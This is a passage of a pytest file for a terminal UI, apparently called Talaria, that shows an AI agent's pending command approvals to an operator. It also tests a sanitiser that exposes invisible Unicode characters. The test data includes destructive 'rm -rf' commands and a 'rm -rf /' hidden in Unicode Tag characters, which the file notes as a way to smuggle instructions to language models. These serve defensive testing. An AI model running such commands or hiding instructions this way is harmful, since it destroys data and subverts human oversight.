        await settle(app, pilot)

        line = next(e.text for e in app.state.transcript if DENIED_EVERY_APPROVAL in e.text)
        # One denial claimed — the card this call actually took — and the
        # approval the ``all`` flag also reached is named, in its own clause,
        # as undecided rather than as denied.
        assert line.startswith(f"{DENIED_EVERY_APPROVAL}: 1 waiting")
        assert f"(+1 {ANSWER_ALREADY_TRAVELLING})" in line
        # The command whose own answer was travelling has exactly one fate in
        # this transcript, and it is the one its own reply reported.
        answered = [e.text for e in app.state.transcript if "approval answered" in e.text]
        assert answered == ["approval answered: once · command: rm -rf /data"]
        assert not any(f"{DENIED_EVERY_APPROVAL}: 2" in e.text for e in app.state.transcript)
        await app.shutdown_sources()


@pytest.mark.asyncio
async def test_a_stale_approval_stops_blocking_the_next_real_one() -> None:
    """**The gateway emits no ``approval.expire``, and nothing else aged one out.**

    ``<bridge>.expire`` covers ``secret``, ``sudo``, ``clarify`` and
    ``terminal.read`` and nothing else (``tui_gateway/server.py:2981-2998``);
    ``tools/approval.py`` drops its entry on timeout through ``_drop_entry()``
    with no emit. So a card for an approval the gateway stopped holding stayed
    forever — and it did more than clutter: a genuine later approval arriving
    beside the phantom was marked unanswerable, because the rule that counts
    outstanding approvals counted the phantom too. The operator could not allow
    the command they wanted to allow, and the only offered action denied it.
    """
    dispatcher = RecordingDispatcher()
    # A live tick, because the withdrawal is the one state change with no event
    # behind it: nothing marks the app dirty when an approval becomes due, so a
    # suite that only renders on demand cannot tell a wired age-out from an
    # unwired one.
    app = live_app(dispatcher, coalesce_interval=0.01)

    async with app.run_test(size=(100, 30)) as pilot:
        stale_at = time.time() - APPROVAL_STALE_AFTER - 1.0
        app.ingest(
            FrameRecord(
                seq=100, at=stale_at, direction="in",
                frame=approval_frame("rm -rf /old", "stale delete"),
            )
        )
        app.ingest(
            FrameRecord(
                seq=101, at=time.time(), direction="in",
                frame=approval_frame(DANGEROUS_COMMAND),
            )
        )
        # Asserted synchronously, before any await lets the tick run: with both
        # approvals outstanding neither answer can be aimed, which is the state
        # the phantom pinned the session in.
        assert [row.answerable for row in project(app.state, mode="live").prompts.rows] == [
            False,
            False,
        ]

        for _ in range(20):
            await asyncio.sleep(0.01)
            await pilot.pause()

        # Positive, from the screen: the surviving approval is the real one,
        # it names its command, and its affirmative is back.
        screen = screen_text(app)
        assert DANGEROUS_COMMAND in screen
        assert "once" in screen
        assert list(app.prompts.card_ids) == ["approval:s1#2"]
        assert app.snapshot is not None
        assert app.snapshot.status.turn == "waiting"

        # What the withdrawal says: no claim about what the gateway did with it.
        note = next(e.text for e in app.state.transcript if APPROVAL_AGED_OUT in e.text)
        assert "rm -rf /old" in note
        assert "probably stopped waiting" in note
        assert "denied" not in note

        await pilot.click("#choice-0")
        await settle(app, pilot)
        assert dispatcher.operator_calls == [
            ("approval.respond", {"session_id": "s1", "choice": "once"})
        ]
        await app.shutdown_sources()


@pytest.mark.asyncio
async def test_the_notice_bar_and_the_transcript_say_one_thing_about_one_answer() -> None:
    """One transport fact, three surfaces, and the notice bar used to be the one
    speaking a different language.

    The transcript took its wording from :func:`read_answer`'s shared table
    while the notice took ``outcome.notice``, the transport layer's own
    sentence — so a single ``NO_REPLY_IN_TIME`` produced "delivery unconfirmed
    — the message was sent and no reply arrived before the deadline" in one
    place and "approval.respond outcome unknown — no reply arrived before the
    deadline. It may or may not have taken effect." in the other, at the same
    moment. ``submit_live`` already overrides ``outcome.notice`` for exactly
    this reason; the prompt path did not inherit it.
    """
    outcome = unknown_outcome("approval.respond", NO_REPLY_IN_TIME, epoch=1)
    dispatcher = RecordingDispatcher(outcome)
    app = live_app(dispatcher)

    async with app.run_test(size=(100, 30)) as pilot:
        feed(app, approval_frame("rm -rf /data", "destructive delete"))
        await settle(app, pilot)
        await app.respond_live("approval:s1#1", "once")
        await settle(app, pilot)

        reason = read_answer("approval", outcome).reason
        assert reason is not None
        expected = f"approval answered: once · command: rm -rf /data — {reason}"
        assert app.composer.notice == expected
        transcript = next(e.text for e in app.state.transcript if "approval answered" in e.text)
        # The transcript entry is clipped by ``record_local_note`` and marks its
        # own cut, so the claim is that one is a prefix of the other — the same
        # sentence, not two sentences that happen to agree.
        assert expected.startswith(transcript.rstrip("…"))
        # Positive, from the screen: the shared vocabulary is what is rendered.
        assert "delivery unconfirmed" in screen_text(app)
        assert "outcome unknown" not in app.composer.notice
        await app.shutdown_sources()


@pytest.mark.asyncio
async def test_a_notice_too_long_for_its_row_is_visibly_cut() -> None:
    """The notice bar is one row and never wraps, and every honest delivery note
    names both what happened and what to do about it — so the operative clause
    is routinely past the edge. A sentence that stops mid-clause reads as a
    sentence that ended.

    (Re-wording the shared submit lines so they *fit* is a different change,
    deferred in QUEUED.md; this is only the marker.)
    """
    dispatcher = RecordingDispatcher()
    app = live_app(dispatcher)
    long_notice = f"2 approvals not denied — {DELIVERY_NOTES['not_sent']}"

    async with app.run_test(size=(80, 24)) as pilot:
        app.composer.show_notice(long_notice)
        await settle(app, pilot)

        rows = [row for row in screen_text(app).splitlines() if "approvals not denied" in row]
        assert len(rows) == 1, rows
        # Positive: the head of the sentence is rendered, and the cut is marked.
        assert "2 approvals not denied — not sent" in rows[0]
        assert "…" in rows[0]
        # The notice widget itself still holds the whole line — the marker is
        # about the row, not about the string being thrown away.
        assert app.composer.notice == long_notice
        await app.shutdown_sources()


# ── round 5: the fixes that only worked for the first case ───────────────


@pytest.mark.asyncio
async def test_a_second_card_does_not_keep_a_title_its_control_cannot_honour() -> None:
    """**Round 4 revealed the first card's control and returned there.**

    ``reveal_actions`` looped over the cards and returned inside the loop body,
    so it looked at the first card and stopped. When that first card's control
    was already on screen — a clarify's input is one row and sits near the top
    — the scroll was a no-op and every card beneath it kept its "waiting for
    you" title with its control below the region's bottom edge.

    A clarify parked above an approval is an ordinary arrangement, not a
    contrived one: the gateway keys its pending-prompt map by request id
    (``tui_gateway/server.py:146``, ``:2961-2964``), so several blocking
    prompts are outstanding at once by design, and ``_block``'s ``timeout``
    accepts ``None`` — a clarify configured with a non-positive timeout waits
    indefinitely.

    Three claims, and the third is what makes the first two a fix rather than a
    relabelling: the revealed card is answerable, the unrevealed card says its
    control is elsewhere instead of claiming to be waiting, and the place it
    points at holds a control that really answers.
    """
    dispatcher = RecordingDispatcher()
    app = live_app(dispatcher)
    command = "rm -rf /var/lib/service-a/cache && systemctl restart service-a && echo " + (
        "x" * 240
    )

    async with app.run_test(size=(120, 40)) as pilot:
        feed(app, event("clarify.request", {"request_id": "c-1", "question": "which branch?"}))
        feed(app, approval_frame(command), seq=101)
        await settle(app, pilot)
        # Before the resize everything fits, so nothing is marked — which is
        # what makes the assertion after the resize a claim about the resize.
        before = app.prompts.card_for("approval:s1#1")
        assert before is not None
        assert str(before.border_title) == WAITING_TITLE

        await pilot.resize_terminal(60, 20)
        for _ in range(3):
            await settle(app, pilot)

        screen = screen_text(app)
        # Positive, all from one screenshot: the clarify still asks its
        # question, the approval still shows the command it is asking about,
        # and the approval's border now names where its answer went.
        assert "which branch?" in screen
        assert "rm -rf /var/lib/service-a/cache" in screen
        assert CONTROL_OFFSCREEN_TITLE in screen
        # …and the card that made that claim is the approval, not the clarify.
        approval_card = app.prompts.card_for("approval:s1#1")
        clarify_card = app.prompts.card_for("c-1")
        assert approval_card is not None and clarify_card is not None
        assert str(approval_card.border_title) == CONTROL_OFFSCREEN_TITLE
        assert str(clarify_card.border_title) == WAITING_TITLE

        # The revealed card answers.
        await pilot.click("#answer")
        await pilot.press("m", "a", "i", "n", "enter")
        await settle(app, pilot)
        assert dispatcher.operator_calls == [
            ("clarify.respond", {"request_id": "c-1", "answer": "main"})
        ]

        # And the card that said "below" was telling the truth: scrolling there
        # puts a working control on screen.
        app.prompts.scroll_end(animate=False)
        await settle(app, pilot)
        assert "once" in screen_text(app)
        await pilot.click("#choice-0")
        await settle(app, pilot)
        assert dispatcher.operator_calls[-1] == (
            "approval.respond",
            {"session_id": "s1", "choice": "once"},
        )
        await app.shutdown_sources()


@pytest.mark.asyncio
async def test_no_card_below_the_fold_is_left_claiming_to_be_waiting() -> None:
    """The same rule with four cards, because "works for the second" is the
    defect this round exists to stop repeating.

    Every card is checked, and the check is two-sided: a card whose control is
    inside the region's scrollable area keeps the waiting title, and a card
    whose control is outside it does not. A one-sided version passes on a
    screen where every card is marked, which would be its own defect.
    """
    dispatcher = RecordingDispatcher()
    app = live_app(dispatcher)
    command = "rm -rf /var/lib/service-a/cache && systemctl restart service-a && echo " + (
        "x" * 200
    )

    async with app.run_test(size=(80, 24)) as pilot:
        feed(app, event("clarify.request", {"request_id": "c-1", "question": "which branch?"}))
        for index in range(3):
            feed(app, approval_frame(f"{command}{index}"), seq=101 + index)
        await settle(app, pilot)
        await pilot.resize_terminal(60, 20)
        for _ in range(3):
            await settle(app, pilot)

        cards = list(app.prompts.query(PromptCard))
        assert len(cards) == 4
        viewport = app.prompts.scrollable_content_region
        marked = 0
        for card in cards:
            target = card.action_widget
            assert target is not None
            on_screen = target.region.height > 0 and viewport.contains_region(target.region)
            expected = WAITING_TITLE if on_screen else CONTROL_OFFSCREEN_TITLE
            assert str(card.border_title) == expected, card.request_id
            marked += not on_screen
        # The arrangement really is one that cannot show them all — otherwise
        # the loop above proved nothing.
        assert marked >= 1
        assert CONTROL_OFFSCREEN_TITLE in screen_text(app)
        await app.shutdown_sources()


@pytest.mark.asyncio
async def test_a_card_mounting_into_a_full_region_is_still_recomputed() -> None:
    """**The case that decided the ``Rewrapped`` channel stays.**

    Round 4 gave the region two triggers for one action and no test could tell
    them apart, so both lenses deleted the whole channel and the suite stayed
    green. Instrumenting the two over a run answers the question round 5 asked:
    once the region has reached its ``max-height`` its size stops changing, so a
    card mounting after that point produces **no** ``Resize`` on the region and
    the panel's own ``Rewrapped`` is the only thing that fires. That is the
    third-or-later approval at an ordinary terminal size, not a corner.

    Deleting the ``post_message`` or the handler leaves the newest card mounted
    below the fold with its "waiting for you" title intact and nothing
    scheduled to notice.
    """
    dispatcher = RecordingDispatcher()
    app = live_app(dispatcher)
    command = "rm -rf /var/lib/service-a/cache && systemctl restart service-a && echo " + (
        "x" * 240
    )
    resizes: list[int] = []

    async with app.run_test(size=(120, 40)) as pilot:
        for index in range(3):
            feed(app, approval_frame(f"{command}{index}"), seq=100 + index)
            await settle(app, pilot)

        region = app.prompts
        assert region.max_scroll_y > 0, "the region is not full, so nothing is being tested"
        original_on_resize = type(region).on_resize

        def counting_on_resize(self: Any, message: Any) -> None:
            resizes.append(1)
            original_on_resize(self, message)

        object.__setattr__(region, "on_resize", counting_on_resize.__get__(region))

        feed(app, approval_frame(f"{command}last"), seq=110)
        await settle(app, pilot)

        # The region never resized, so ``on_resize`` cannot be what recomputed.
        assert resizes == []
        newest = region.card_for("approval:s1#4")
        assert newest is not None
        target = newest.action_widget
        assert target is not None
        assert not region.scrollable_content_region.contains_region(target.region)

        # Wait for the marking rather than sampling at a fixed refresh depth.
        #
        # The marking is two chained ``call_after_refresh`` calls deep —
        # ``Rewrapped`` → ``reveal_actions`` → ``mark_unreachable_controls`` —
        # while ``settle`` pumps exactly two refresh cycles. That is a margin
        # with no slack, and on a slower machine the assertion below sampled the
        # arrangement before the second deferral landed: this test failed twice
        # on GitHub runners, always on this assertion, and never reproducibly
        # here (20 runs alone and 6 full-suite runs under six busy loops, all
        # green, all needing zero extra cycles).
        #
        # **This does not weaken the test.** If the marking never lands — which
        # is exactly what deleting the ``post_message`` or the handler causes,
        # the defect this test exists for — the budget runs out and the
        # assertion still fails. What it stops asserting is a particular
        # *number of refresh cycles*, which was never the behaviour under test.
        for _ in range(40):
            if str(newest.border_title) == CONTROL_OFFSCREEN_TITLE:
                break
            await pilot.pause()
        assert str(newest.border_title) == CONTROL_OFFSCREEN_TITLE
        # Positive, from the screen: the region is showing cards, and one of
        # them carries the marker.
        screen = screen_text(app)
        assert "rm -rf /var/lib/service-a/cache" in screen
        assert CONTROL_OFFSCREEN_TITLE in screen
        await app.shutdown_sources()


@pytest.mark.asyncio
async def test_a_withdrawn_approval_never_leaves_the_screen_saying_working(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """**Ageing an approval out removed the evidence that the session was
    blocked, and the screen went back to claiming work.**

    ``turn_status`` reports ``waiting`` only while ``state.prompts`` is
    non-empty, so the instant :func:`age_out_approvals` fires the turn falls
    back to ``streaming`` and ``activity_line`` renders ``working…`` — the
    exact claim ``turn_status``'s own docstring forbids.

    Whether it is a lie depends on a number Talaria cannot read. The gateway
    fails closed and returns (``tools/approval.py:4050`` records ``"outcome":
    "timeout"``), so under its default 300-second wait the agent really did
    resume. A deployment that raised that timeout above Talaria's own
    :data:`APPROVAL_STALE_AFTER` gets the other case, where the gateway is
    still holding and the session will never move. So the screen states the
    withdrawal and refuses the half it cannot know.

    The status document is asserted *unchanged*, because KTD5 freezes the turn
    field at four values (``docs/formats/status-line.md``) and this is spent on
    the screen rather than on the contract.
    """
    dispatcher = RecordingDispatcher()
    app = live_app(dispatcher, coalesce_interval=0.01)

    async with app.run_test(size=(100, 30)) as pilot:
        feed(app, event("message.start", {}))
        feed(app, event("message.delta", {"text": "planning the change\n"}), seq=101)
        app.ingest(
            FrameRecord(
                seq=102,
                at=time.time(),
                direction="in",
                frame=approval_frame(DANGEROUS_COMMAND),
            )
        )
        await settle(app, pilot)
        assert app.prompts.activity_text.startswith("waiting for you — approval")

        monkeypatch.setattr(domain_state, "APPROVAL_STALE_AFTER", 0.05)
        for _ in range(20):
            await asyncio.sleep(0.01)
            await pilot.pause()

        assert app.state.withdrawn_approvals == 1
        assert app.snapshot is not None
        # The frozen contract still reads exactly as before — that is the
        # limitation this fix works around rather than the thing it changed.
        assert app.snapshot.status.turn == "streaming"
        assert app.snapshot.status.pending_prompts == 0

        expected = withdrawn_activity_line(1)
        assert app.prompts.activity_text == expected
        screen = screen_text(app)
        # Positive and negative from one screenshot: the honest sentence is
        # rendered, and the claim it replaced is nowhere on the same screen.
        assert "1 approval withdrawn" in screen
        assert "is unknown" in screen
        assert "working…" not in screen

        # And the unknown ends the moment the agent is observed doing
        # something, rather than hedging over a session that can be watched.
        feed(app, event("message.delta", {"text": "resuming\n"}), seq=103)
        await settle(app, pilot)
        assert app.state.withdrawn_approvals == 0
        assert app.prompts.activity_text == "working…"
        assert "working…" in screen_text(app)
        await app.shutdown_sources()


@pytest.mark.asyncio
async def test_an_approval_that_goes_stale_while_the_session_is_quiet_is_withdrawn(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """**The case the age-out exists for, which nothing tested.**

    ``_age_out_approvals`` is called above ``_render_tick``'s
    ``if not self._dirty: return``, and the comment says why: a withdrawal is
    the one state change with no event behind it, so placed below the early
    return it fires only when some unrelated frame happens to arrive — which
    for a session blocked on a stale approval is never. Moving the call below
    the dirty check left the whole suite green, because every stale approval in
    it is stale *on arrival* and the first dirty tick after ingest withdraws it.

    This one arrives fresh, renders, lets the app go quiet, and only then goes
    stale. ``_dirty`` is asserted ``False`` before the wait, so the ticks that
    follow carry nothing but the timer.
    """
    dispatcher = RecordingDispatcher()
    app = live_app(dispatcher, coalesce_interval=0.01)

    async with app.run_test(size=(100, 30)) as pilot:
        app.ingest(
            FrameRecord(
                seq=100,
                at=time.time(),
                direction="in",
                frame=approval_frame(DANGEROUS_COMMAND),
            )
        )
        await settle(app, pilot)

        # Fresh, on screen, answerable — and the app has nothing left to draw.
        screen = screen_text(app)
        assert DANGEROUS_COMMAND in screen
        assert "once" in screen
        assert list(app.prompts.card_ids) == ["approval:s1#1"]
        assert app._dirty is False

        monkeypatch.setattr(domain_state, "APPROVAL_STALE_AFTER", 0.05)
        for _ in range(20):
            await asyncio.sleep(0.01)
            await pilot.pause()

        assert list(app.prompts.card_ids) == []
        note = next(e.text for e in app.state.transcript if APPROVAL_AGED_OUT in e.text)
        assert DANGEROUS_COMMAND in note
        # Positive, from the screen: the withdrawal is rendered where the card
        # used to be, so the operator is not left looking at a silent gap.
        assert "approval no longer offered" in screen_text(app)
        await app.shutdown_sources()


@pytest.mark.parametrize(
    "outcome,marker",
    [
        (
            unknown_outcome("terminal.read.respond", NO_REPLY_IN_TIME, epoch=1),
            "delivery unconfirmed",
        ),
        (
            RpcOutcome(
                status="error",
                method="terminal.read.respond",
                request_id="1",
                epoch=1,
                error_code=-32000,
                error_message="gateway said no",
            ),
            "refused by the gateway",
        ),
        (
            RpcOutcome(
                status="ok",
                method="terminal.read.respond",
                request_id="1",
                epoch=1,
                result={"status": "expired"},
            ),
            GATEWAY_DISCARDED_ANSWER,
        ),
    ],
    ids=["unconfirmed", "refused", "discarded"],
)
@pytest.mark.asyncio
async def test_no_failed_terminal_read_writes_into_the_buffer_it_serves(
    outcome: RpcOutcome, marker: str
) -> None:
    """**One rule, all four outcome classes — round 4 covered one of them.**

    ``terminal.read`` serves the transcript back to the agent, so a line
    Talaria writes about its own answer becomes part of the next answer. Round
    3 met the compounding form of that and round 4 fixed it for
    ``not_sent`` alone, keying the guard off ``verdict.restore``. Refused,
    discarded and delivery-unconfirmed each still wrote one line per failed
    read.

    The transcript assertion is against the entries rather than the screen
    because the notice bar carries the same sentence on the same screen; the
    positive that pairs with it is that sentence, read off the rendered screen.
    """
    dispatcher = RecordingDispatcher(outcome)
    app = live_app(dispatcher)

    async with app.run_test(size=(100, 30)) as pilot:
        feed(app, event("terminal.read.request", {"request_id": "t-1"}))
        await settle(app, pilot)

        assert [m for m, _ in dispatcher.operator_calls] == ["terminal.read.respond"]
        assert app.state.prompt_for("t-1") is None
        # Nothing about the *answer* reached the buffer this bridge serves.
        assert not [e for e in app.state.transcript if "terminal read answered" in e.text]
        assert not [
            e for e in app.state.transcript if "terminal read not answered" in e.text
        ]
        # The one line that is allowed there is the gateway's request arriving,
        # which is a record of what was asked rather than of what was replied.
        assert any("terminal_read prompt awaiting" in e.text for e in app.state.transcript)
        # Positive, from the screen: the operator was told, on the surface the
        # read projection does not read.
        assert marker in app.composer.notice
        assert "terminal read" in screen_text(app)
        await app.shutdown_sources()


def test_the_defang_table_covers_every_unicode_format_character() -> None:
    """**The docstring claimed a set the table did not hold.**

    ``defang``'s table said it was "the Unicode bidirectional formatting set
    plus the invisible-but-not-formatting characters that share its effect",
    and it held eighteen codepoints. The Tag block ``U+E0020``–``U+E007F`` —
    category ``Cf``, no ink, and the current standard carrier for text hidden
    inside a string aimed at a language model — passed straight through, as did
    the invisible math operators, the interlinear annotation anchors, the
    variation selectors and the Hangul fillers. A comment that overstates a
    security control is worse than no comment.

    Derived from ``unicodedata`` here and enumerated in the module, which is
    the split round 4 chose and this keeps: no per-character loop on the hot
    path, no code-space scan at import, and a suite that fails when a Unicode
    release adds a format character the table has not heard of.
    """
    import unicodedata

    missing = [
        cp
        for cp in range(0x110000)
        if unicodedata.category(chr(cp)) == "Cf" and defang(chr(cp)) != INVISIBLE_MARK
    ]
    assert missing == [], [f"U+{cp:04X}" for cp in missing]

    # The half that is not ``Cf`` and shares the effect anyway, named one by
    # one so dropping a range from the table fails here rather than silently.
    for codepoint in (0x115F, 0x1160, 0x3164, 0xFE00, 0xFE0F, 0xFFA0, 0xE0100, 0xE01EF):
        assert defang(chr(codepoint)) == INVISIBLE_MARK, f"U+{codepoint:04X}"

    # A hidden instruction carried in Tag characters is one cell per character
    # on screen instead of nothing at all.
    hidden = "".join(chr(0xE0000 + ord(c)) for c in "rm -rf /")
    assert defang(f"echo hi{hidden}") == "echo hi" + INVISIBLE_MARK * len("rm -rf /")

    # And ordinary text is untouched, so the sweep above is not passing because
    # ``defang`` replaces everything.
    assert defang("git status --short") == "git status --short"


@pytest.mark.asyncio
async def test_a_withdrawal_survives_an_event_that_is_not_the_agent_working(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """**The clearing rule is narrow on purpose, and the narrowness is the point.**

    A withdrawal says the agent's state is unknown. The case it must *not*
    clear on is the bad one — the gateway still holding the approval while the
    agent is blocked inside the tool call producing nothing — and in that case
    the socket stays alive and events keep arriving. So "an event arrived" is
    not evidence and only turn progress is.

    A live prompt outranks the hedge while it is up, because it is something
    the operator can act on; when it goes, the hedge comes back rather than
    the session quietly reverting to ``working…``.
    """
    dispatcher = RecordingDispatcher()
    app = live_app(dispatcher, coalesce_interval=0.01)

    async with app.run_test(size=(100, 30)) as pilot:
        feed(app, event("message.start", {}))
        feed(app, event("message.delta", {"text": "planning\n"}), seq=101)
        app.ingest(
            FrameRecord(
                seq=102,
                at=time.time(),
                direction="in",
                frame=approval_frame(DANGEROUS_COMMAND),
            )
        )
        await settle(app, pilot)
        monkeypatch.setattr(domain_state, "APPROVAL_STALE_AFTER", 0.05)
        for _ in range(20):
            await asyncio.sleep(0.01)
            await pilot.pause()
        assert app.state.withdrawn_approvals == 1

        # An unrelated blocking prompt arrives. The socket is demonstrably
        # alive; the agent is demonstrably not observed doing anything.
        feed(app, event("clarify.request", {"request_id": "c-1", "question": "which?"}), seq=103)
        await settle(app, pilot)
        assert app.state.withdrawn_approvals == 1
        assert app.prompts.activity_text == "waiting for you — clarify: which?"
        # Positive, from the screen: the prompt that outranks the hedge is up.
        assert "which?" in screen_text(app)

        feed(app, event("clarify.expire", {"request_id": "c-1"}), seq=104)
        await settle(app, pilot)
        assert app.state.withdrawn_approvals == 1
        assert app.prompts.activity_text == withdrawn_activity_line(1)
        screen = screen_text(app)
        assert "1 approval withdrawn" in screen
        assert "working…" not in screen
        await app.shutdown_sources()
